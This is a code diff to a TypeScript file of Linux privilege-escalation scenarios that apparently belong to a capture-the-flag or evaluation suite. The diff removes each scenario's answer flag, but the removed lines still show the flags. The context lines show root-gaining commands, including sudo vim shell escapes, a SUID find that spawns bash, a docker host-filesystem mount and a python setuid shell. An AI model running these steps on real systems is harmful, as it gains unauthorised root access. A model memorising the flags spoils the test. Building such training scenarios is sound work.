@@ -28,7 +28,6 @@ export const PRIVESC_SCENARIOS: PrivescScenario[] = [
       'find /tmp -exec /bin/bash -p \\;',
       'cat /root/flag.txt',
     ],
-    flag: 'FLAG{su1d_b1nary_3scalation_f0und}',
   },
   {
     id: 'privesc-002',
@@ -56,7 +55,6 @@ export const PRIVESC_SCENARIOS: PrivescScenario[] = [
       'sudo -l',
       'sudo vim -c ":!cat /root/flag.txt"',
     ],
-    flag: 'FLAG{sudo_vim_3sc4pe_to_ro0t}',
   },
   {
     id: 'privesc-003',
@@ -89,7 +87,6 @@ export const PRIVESC_SCENARIOS: PrivescScenario[] = [
       'sleep 65',
       'cat /home/dev/flag_output.txt',
     ],
-    flag: 'FLAG{cr0n_j0b_writable_sc1pt_pr1vesc}',
   },
   {
     id: 'privesc-004',
@@ -120,7 +117,6 @@ export const PRIVESC_SCENARIOS: PrivescScenario[] = [
       'su pwned',
       'cat /root/flag.txt',
     ],
-    flag: 'FLAG{wr1t4ble_3tc_p4sswd_3scalation}',
   },
   {
     id: 'privesc-005',
@@ -154,7 +150,6 @@ export const PRIVESC_SCENARIOS: PrivescScenario[] = [
       './exploit',
       'cat /root/flag.txt',
     ],
-    flag: 'FLAG{k3rn3l_3xplo1t_cve_2015_1328}',
   },
   {
     id: 'privesc-006',
@@ -184,7 +179,6 @@ export const PRIVESC_SCENARIOS: PrivescScenario[] = [
       'python3.4 -c "import os; os.setuid(0); os.system(\'/bin/bash\')"',
       'cat /root/flag.txt',
     ],
-    flag: 'FLAG{c4p4b1l1ty_c4p_setuid_pyth0n}',
   },
   {
     id: 'privesc-007',
@@ -220,7 +214,6 @@ export const PRIVESC_SCENARIOS: PrivescScenario[] = [
       '/usr/local/bin/db_backup.sh',
       'cat /home/dev/root_flag.txt',
     ],
-    flag: 'FLAG{p4th_h1j4ck_pr1vesc_cr0n}',
   },
   {
     id: 'privesc-008',
@@ -248,7 +241,6 @@ export const PRIVESC_SCENARIOS: PrivescScenario[] = [
       'id',
       'docker run -v /:/mnt --rm -it alpine chroot /mnt cat /root/flag.txt',
     ],
-    flag: 'FLAG{d0ck3r_gr0up_m0unt_h0st_f1lesystem}',
   },
   {
     id: 'privesc-009',
@@ -282,7 +274,6 @@ export const PRIVESC_SCENARIOS: PrivescScenario[] = [
       './rootsh',
       'cat /root/flag.txt',
     ],
-    flag: 'FLAG{nfs_n0_r00t_sqush_3scalation}',
   },
   {
     id: 'privesc-010',
@@ -315,6 +306,5 @@ export const PRIVESC_SCENARIOS: PrivescScenario[] = [
       'sleep 65',
       'cat /var/log/scratch.log',
     ],
-    flag: 'FLAG{st1cky_b1t_r4ce_c0nd1t10n}',
   },
 ];
